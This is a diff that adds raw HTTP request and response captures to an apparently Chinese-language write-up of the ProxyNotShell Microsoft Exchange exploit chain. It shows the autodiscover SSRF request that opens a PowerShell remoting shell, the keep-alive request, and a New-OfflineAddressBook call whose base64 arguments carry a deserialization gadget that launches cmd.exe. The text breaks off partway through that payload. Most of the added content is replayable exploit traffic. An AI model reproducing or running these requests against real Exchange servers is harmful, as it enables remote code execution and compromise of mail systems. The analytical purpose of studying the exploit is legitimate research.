@@ -672,6 +672,73 @@ ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端�
 
  - ![](pics/proxynotshell5.png)
 
+ - request
+
+``` bash
+POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
+Host: 192.168.14.6
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Content-Type: application/soap+xml;charset=UTF-8
+Cookie: Email=autodiscover/admin@localhost
+Content-Length: 7076
+Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHIAAAAmASYBigAAAAAAAABYAAAAGgAaAFgAAAAAAAAAcgAAABAAEACwAQAANYKJ4gYBsR0AAAAPhC4i/YVS+VB0G4hNptNku2EAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdwnLRH74UZh1WHEOmDltNwEBAAAAAAAAZCww0zTi2QHzuBzg/jLiNgAAAAACABgARQBYAEMASABBAE4ARwBFADIAMAAxADYAAQAeAFcASQBOAC0AVQBQAEYAMAA5AFIANwBIADIANgA0AAQAIABlAHgAYwBoAGEAbgBnAGUAMgAwADEANgAuAGMAbwBtAAMAQABXAEkATgAtAFUAUABGADAAOQBSADcASAAyADYANAAuAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABQAgAGUAeABjAGgAYQBuAGcAZQAyADAAMQA2AC4AYwBvAG0ABwAIAGQsMNM04tkBBgAEAAIAAAAKABAA5zRZWjBRW9TZInuvk2v9vQAAAAAAAAAAhe1lJqMaH9fVr+rLcgUHxA==
+
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
+        <s:Header>
+                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
+                <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
+                <a:ReplyTo>
+                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+                </a:ReplyTo>
+                <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
+                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
+                <a:MessageID>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:MessageID>
+                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
+                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
+                <p:SessionId s:mustUnderstand="false">uuid:d5a6b749-9109-4bc7-969a-4223ef795a72</p:SessionId>
+                <p:OperationID s:mustUnderstand="false">uuid:381b8e15-dff7-4812-9867-3bc71f9b5ed3</p:OperationID>
+                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
+                <w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
+
+                        <w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
+                </w:OptionSet>
+                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
+        </s:Header>
+        <s:Body>
+                <rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
+                        <rsp:InputStreams>stdin pr</rsp:InputStreams>
+                        <rsp:OutputStreams>stdout</rsp:OutputStreams>
+                        <creationXml xmlns="http://schemas.microsoft.com/powershell">AAAAAAAAAAEAAAAAAAAAAAMAAADHAgAAAAIAAQCkwAes2LBAQZqGoPGMPzz/AAAAAAAAAAAAAAAAAAAAADxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPgAAAAAAAAACAAAAAAAAAAADAAAOiwIAAAAEAAEApMAHrNiwQEGahqDxjD88/wAAAAAAAAAAAAAAAAAAAAA8T2JqIFJlZklkPSIwIj48TVM+PEkzMiBOPSJNaW5SdW5zcGFjZXMiPjE8L0kzMj48STMyIE49Ik1heFJ1bnNwYWNlcyI+MTwvSTMyPjxPYmogTj0iUFNUaHJlYWRPcHRpb25zIiBSZWZJZD0iMSI+PFROIFJlZklkPSIwIj48VD5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5QU1RocmVhZE9wdGlvbnM8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPkRlZmF1bHQ8L1RvU3RyaW5nPjxJMzI+MDwvSTMyPjwvT2JqPjxPYmogTj0iQXBhcnRtZW50U3RhdGUiIFJlZklkPSIyIj48VE4gUmVmSWQ9IjEiPjxUPlN5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGU8L1Q+PFQ+U3lzdGVtLkVudW08L1Q+PFQ+U3lzdGVtLlZhbHVlVHlwZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PFRvU3RyaW5nPlVua25vd248L1RvU3RyaW5nPjxJMzI+MjwvSTMyPjwvT2JqPjxPYmogTj0iQXBwbGljYXRpb25Bcmd1bWVudHMiIFJlZklkPSIzIj48VE4gUmVmSWQ9IjIiPjxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNQcmltaXRpdmVEaWN0aW9uYXJ5PC9UPjxUPlN5c3RlbS5Db2xsZWN0aW9ucy5IYXNodGFibGU8L1Q+PFQ+U3lzdGVtLk9iamVjdDwvVD48L1ROPjxEQ1Q+PEVuPjxTIE49IktleSI+UFNWZXJzaW9uVGFibGU8L1M+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjQiPjxUTlJlZiBSZWZJZD0iMiIgLz48RENUPjxFbj48UyBOPSJLZXkiPlBTVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPlBTRWRpdGlvbjwvUz48UyBOPSJWYWx1ZSI+RGVza3RvcDwvUz48L0VuPjxFbj48UyBOPSJLZXkiPlBTQ29tcGF0aWJsZVZlcnNpb25zPC9TPjxPYmogTj0iVmFsdWUiIFJlZklkPSI1Ij48VE4gUmVmSWQ9IjMiPjxUPlN5c3RlbS5WZXJzaW9uW108L1Q+PFQ+U3lzdGVtLkFycmF5PC9UPjxUPlN5c3RlbS5PYmplY3Q8L1Q+PC9UTj48TFNUPjxWZXJzaW9uPjEuMDwvVmVyc2lvbj48VmVyc2lvbj4yLjA8L1ZlcnNpb24+PFZlcnNpb24+My4wPC9WZXJzaW9uPjxWZXJzaW9uPjQuMDwvVmVyc2lvbj48VmVyc2lvbj41LjA8L1ZlcnNpb24+PFZlcnNpb24+NS4xLjE5MDQxLjYxMDwvVmVyc2lvbj48L0xTVD48L09iaj48L0VuPjxFbj48UyBOPSJLZXkiPkNMUlZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjQuMC4zMDMxOS40MjAwMDwvVmVyc2lvbj48L0VuPjxFbj48UyBOPSJLZXkiPkJ1aWxkVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+MTAuMC4xOTA0MS42MTA8L1ZlcnNpb24+PC9Fbj48RW4+PFMgTj0iS2V5Ij5XU01hblN0YWNrVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+My4wPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+UFNSZW1vdGluZ1Byb3RvY29sVmVyc2lvbjwvUz48VmVyc2lvbiBOPSJWYWx1ZSI+Mi4zPC9WZXJzaW9uPjwvRW4+PEVuPjxTIE49IktleSI+U2VyaWFsaXphdGlvblZlcnNpb248L1M+PFZlcnNpb24gTj0iVmFsdWUiPjEuMS4wLjE8L1ZlcnNpb24+PC9Fbj48L0RDVD48L09iaj48L0VuPjwvRENUPjwvT2JqPjxPYmogTj0iSG9zdEluZm8iIFJlZklkPSI2Ij48TVM+PE9iaiBOPSJfaG9zdERlZmF1bHREYXRhIiBSZWZJZD0iNyI+PE1TPjxPYmogTj0iZGF0YSIgUmVmSWQ9IjgiPjxUTiBSZWZJZD0iNCI+PFQ+U3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZTwvVD48VD5TeXN0ZW0uT2JqZWN0PC9UPjwvVE4+PERDVD48RW4+PEkzMiBOPSJLZXkiPjk8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iOSI+PE1TPjxTIE49IlQiPlN5c3RlbS5TdHJpbmc8L1M+PFMgTj0iViI+QWRtaW5pc3RyYXRvcjogV2luZG93cyBQb3dlclNoZWxsPC9TPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjg8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTAiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxMSI+PE1TPjxJMzIgTj0id2lkdGgiPjI3NDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij43MjwvSTMyPjwvTVM+PC9PYmo+PC9NUz48L09iaj48L0VuPjxFbj48STMyIE49IktleSI+NzwvSTMyPjxPYmogTj0iVmFsdWUiIFJlZklkPSIxMiI+PE1TPjxTIE49IlQiPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uSG9zdC5TaXplPC9TPjxPYmogTj0iViIgUmVmSWQ9IjEzIj48TVM+PEkzMiBOPSJ3aWR0aCI+MTIwPC9JMzI+PEkzMiBOPSJoZWlnaHQiPjcyPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij42PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LlNpemU8L1M+PE9iaiBOPSJWIiBSZWZJZD0iMTUiPjxNUz48STMyIE49IndpZHRoIj4xMjA8L0kzMj48STMyIE49ImhlaWdodCI+NTA8L0kzMj48L01TPjwvT2JqPjwvTVM+PC9PYmo+PC9Fbj48RW4+PEkzMiBOPSJLZXkiPjU8L0kzMj48T2JqIE49IlZhbHVlIiBSZWZJZD0iMTYiPjxNUz48UyBOPSJUIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QuU2l6ZTwvUz48T2JqIE49IlYiIFJlZklkPSIxNyI+PE1TPjxJMzIgTj0id2lkdGgiPjEyMDwvSTMyPjxJMzIgTj0iaGVpZ2h0Ij4zMDAwPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij40PC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE4Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkludDMyPC9TPjxJMzIgTj0iViI+MjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4zPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjE5Ij48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIwIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij4wPC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4yPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIxIj48TVM+PFMgTj0iVCI+U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0LkNvb3JkaW5hdGVzPC9TPjxPYmogTj0iViIgUmVmSWQ9IjIyIj48TVM+PEkzMiBOPSJ4Ij4wPC9JMzI+PEkzMiBOPSJ5Ij45PC9JMzI+PC9NUz48L09iaj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4xPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjIzIj48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjU8L0kzMj48L01TPjwvT2JqPjwvRW4+PEVuPjxJMzIgTj0iS2V5Ij4wPC9JMzI+PE9iaiBOPSJWYWx1ZSIgUmVmSWQ9IjI0Ij48TVM+PFMgTj0iVCI+U3lzdGVtLkNvbnNvbGVDb2xvcjwvUz48STMyIE49IlYiPjY8L0kzMj48L01TPjwvT2JqPjwvRW4+PC9EQ1Q+PC9PYmo+PC9NUz48L09iaj48QiBOPSJfaXNIb3N0TnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFVJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX2lzSG9zdFJhd1VJTnVsbCI+ZmFsc2U8L0I+PEIgTj0iX3VzZVJ1bnNwYWNlSG9zdCI+ZmFsc2U8L0I+PC9NUz48L09iaj48L01TPjwvT2JqPg==</creationXml>
+                </rsp:Shell>
+        </s:Body>
+</s:Envelope>
+```
+
+ - response
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/soap+xml;charset=UTF-8
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: 9e7c0cd2-dffd-48da-8fd4-c0e272cecb1f
+X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
+X-AspNet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc7Lxc/GgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:14:09 GMT; path=/autodiscover; secure; HttpOnly
+Persistent-Auth: true
+X-Powered-By: ASP.NET
+X-FEServer: WIN-UPF09R7H264
+Date: Fri, 08 Sep 2023 09:14:09 GMT
+Content-Length: 866
+
+<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:7F45298C-DA0C-4B21-8345-C1064F467C36</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:89d1d533-39ea-4e1f-b566-463e276e9ce8</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>29E4FDEC-DF97-4A5B-A515-8D25F7CD3437</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/powershell/Microsoft.Exchange</rsp:ResourceUri><rsp:Owner>exchange2016\administrator</rsp:Owner><rsp:ClientIP>fe80::841b:99cc:dec2:b8a%5</rsp:ClientIP><rsp:IdleTimeOut>PT900.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin pr</rsp:InputStreams><rsp:OutputStreams>stdout</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
+```
+
 ### step2
 
 使用XML SOAP的HTTP POST请求来延长shell的生命周期
@@ -679,6 +746,69 @@ ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端�
 启动shell后，攻击者立即延长其生命周期；否则，默认情况下，由于shell的过期时间太短，shell将被关闭。这是在Exchange Server上进一步执行命令所必需的。要做到这一点，攻击者立即通过启用keep alive选项的WSMAN发送一个特殊请求。
 
  - ![](pics/proxynotshell6.png)
+
+ - request
+
+``` bash
+POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
+Host: 192.168.14.6
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Content-Type: application/soap+xml;charset=UTF-8
+Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczJgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
+Content-Length: 1731
+
+<s:Envelope xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:wsmv="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
+    <s:Header>
+        <wsa:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</wsa:Action>
+        <wsmv:DataLocale s:mustUnderstand="false" xml:lang="en-US" />
+        <wsman:Locale s:mustUnderstand="false" xml:lang="en-US" />
+        <wsman:MaxEnvelopeSize s:mustUnderstand="true">512000</wsman:MaxEnvelopeSize>
+        <wsa:MessageID>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</wsa:MessageID>
+        <wsman:OperationTimeout>PT20S</wsman:OperationTimeout>
+        <wsa:ReplyTo>
+            <wsa:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</wsa:Address>
+        </wsa:ReplyTo>
+        <wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>
+        <wsmv:SessionId s:mustUnderstand="false">uuid:9f62f84e-9ccf-47dc-9c85-44528f897ec6</wsmv:SessionId>
+        <wsa:To>http://ex01.lab.local/</wsa:To>
+        <wsman:OptionSet s:mustUnderstand="true">
+            <wsman:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">True</wsman:Option>
+        </wsman:OptionSet>
+        <wsman:SelectorSet>
+            <wsman:Selector Name="ShellId">84E4CBD2-CE57-4D84-B623-0ADD3EBAFF2A</wsman:Selector>
+        </wsman:SelectorSet>
+    </s:Header>
+    <s:Body>
+        <rsp:Receive>
+            <rsp:DesiredStream>stdout</rsp:DesiredStream>
+        </rsp:Receive>
+    </s:Body>
+        </s:Envelope>
+```
+
+ - response
+
+``` bash
+HTTP/1.1 200 OK
+Cache-Control: private
+Content-Type: application/soap+xml;charset=UTF-8
+Content-Encoding: gzip
+Vary: Accept-Encoding
+Server: Microsoft-IIS/10.0
+request-id: bc066085-69d9-4848-909a-c24723f86a29
+X-CalculatedBETarget: win-upf09r7h264.exchange2016.com
+X-AspNet-Version: 4.0.30319
+Set-Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3NxczIgZqHnJeekZiazc/OydGckJKBzw==; expires=Sun, 08-Oct-2023 09:22:37 GMT; path=/autodiscover; secure; HttpOnly
+X-Powered-By: ASP.NET
+X-FEServer: WIN-UPF09R7H264
+Date: Fri, 08 Sep 2023 09:22:36 GMT
+Content-Length: 678
+
+<s:Envelope xml:lang="zh-CN" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:6747A94B-9EB8-479A-9A52-F85A259A1B3D</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:e7b63b02-c710-4671-8bc8-ef16fbd3dd2f</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:Stream Name="stdout">AAAAAAAACmcAAAAAAAAAAAMAAADKAQAAAAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO+7vzxPYmogUmVmSWQ9IjAiPjxNUz48VmVyc2lvbiBOPSJwcm90b2NvbHZlcnNpb24iPjIuMzwvVmVyc2lvbj48VmVyc2lvbiBOPSJQU1ZlcnNpb24iPjIuMDwvVmVyc2lvbj48VmVyc2lvbiBOPSJTZXJpYWxpemF0aW9uVmVyc2lvbiI+MS4xLjAuMTwvVmVyc2lvbj48L01TPjwvT2JqPg==</rsp:Stream></rsp:ReceiveResponse></s:Body></s:Envelope>
+```
 
 ### step3
 
@@ -691,6 +821,129 @@ ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端�
 执行calc.exe进程的主payload部分
 
  - ![](pics/proxynotshell8.png)
+
+ - request
+
+``` bash
+POST /autodiscover/admin@localhost//powershell/autodiscover.json?x=a HTTP/1.1
+Host: 192.168.14.6
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+Content-Type: application/soap+xml;charset=UTF-8
+Cookie: X-BackEndCookie=S-1-5-21-46962994-2066588249-799565096-500=u56Lnp2ejJqBmsmZy5yZz8zSns2bzNLLysmd0sbOy8/SzJ2eyMjOmc+enJ7HgYHNz83M0s7P0s/Hq8/Gxc3HxcvPgZqHnJeekZiazc/OydGckJKBzw==; Email=autodiscover/admin@localhost
+Content-Length: 4071
+
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
+        <s:Header>
+                <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
+                <a:ReplyTo>
+                        <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
+                </a:ReplyTo>
+                <a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
+                <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
+                <a:MessageID>uuid:5dc68edc-045d-4639-a3a2-f11b0c3d9d24</a:MessageID>
+                <w:Locale xml:lang="en-US" s:mustUnderstand="false" />
+                <p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
+                <p:SessionId s:mustUnderstand="false">uuid:92d15a07-25ed-455c-913c-f75b789db485</p:SessionId>
+                <p:OperationID s:mustUnderstand="false">uuid:86aa8b58-a678-4f53-a86b-c0ca5fde4238</p:OperationID>
+                <p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
+                <w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
+                <w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
+                        <w:Selector Name="ShellId">7ECF1934-4CC8-4322-B6C7-54FE32AFB3DC</w:Selector>
+                </w:SelectorSet>
+                <w:OperationTimeout>PT180.000S</w:OperationTimeout>
+        </s:Header>
+        <s:Body>
+        <rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="f09f9889-40ba-4a66-8b8f-be91c03e8376" >
+                <rsp:Command>New-OfflineAddressBook</rsp:Command>
+                <rsp:Arguments>AAAAAAAAAAMAAAAAAAAAAAMAAAZ6AgAAAAYQAgDw5UZdjgU/Qqbzjccy2sTUiZif8LpAZkqLj76RwD6DdjxPYmogUmVmSWQ9IjEzIj4KCQkJPFROIFJlZklkPSIwIj4KCQkJCTxUPlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3Q8L1Q+CgkJCQk8VD5TeXN0ZW0uT2JqZWN0PC9UPgoJCQk8L1ROPgoJCQk8TVM+CgkJCQk8UyBOPSJOIj4tSWRlbnRpdHk6PC9TPgoJCQkJCQkJCTwhLS1PYmplY3QgdHlwZSBzZWN0aW9uLS0+CgkJCQk8T2JqIE49IlYiIFJlZklkPSIxNCI+CgkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQk8VD5TeXN0ZW0uU2VydmljZVByb2Nlc3MuU2VydmljZUNvbnRyb2xsZXI8L1Q+CgkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJPC9UTj4KCQkJCQk8VG9TdHJpbmc+U3lzdGVtLlNlcnZpY2VQcm9jZXNzLlNlcnZpY2VDb250cm9sbGVyPC9Ub1N0cmluZz4KCgkJCQkJPFByb3BzPgoJCQkJCQk8UyBOPSJOYW1lIj5UeXBlPC9TPgoJCQkJCQk8T2JqIE49IlRhcmdldFR5cGVGb3JEZXNlcmlhbGl6YXRpb24iPgoJCQkJCQkJPFROIFJlZklkPSIyIj4KCQkJCQkJCQk8VD5TeXN0ZW0uRXhjZXB0aW9uPC9UPgoJCQkJCQkJCTxUPlN5c3RlbS5PYmplY3Q8L1Q+CgkJCQkJCQk8L1ROPgoJCQkJCQkJPE1TPgoJCQkJCQkJCTxCQSBOPSJTZXJpYWxpemF0aW9uRGF0YSI+QUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFCOVRlWE4wWlcwdVZXNXBkSGxUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBUkVZWFJoQ1ZWdWFYUjVWSGx3WlF4QmMzTmxiV0pzZVU1aGJXVUJBQUVJQmdJQUFBQWdVM2x6ZEdWdExsZHBibVJ2ZDNNdVRXRnlhM1Z3TGxoaGJXeFNaV0ZrWlhJRUFBQUFCZ01BQUFCWVVISmxjMlZ1ZEdGMGFXOXVSbkpoYldWM2IzSnJMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OU16Rmlaak00TlRaaFpETTJOR1V6TlFzPTwvQkE+CgkJCQkJCQk8L01TPgoJCQkJCQk8L09iaj4KCQkJCQk8L1Byb3BzPgoKCQkJCQk8Uz4KICAgICAgICAgICAgICAgICAgICAgICAgPCFbQ0RBVEFbPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6U3lzdGVtPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIgeG1sbnM6RGlhZz0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9c3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJMYXVuY2hDYWxjaCIgT2JqZWN0VHlwZT0ie3g6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lPSJTdGFydCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxTeXN0ZW06U3RyaW5nPmNtZC5leGU8L1N5c3RlbTpTdHJpbmc+PFN5c3RlbTpTdHJpbmc+L2MgbXNwY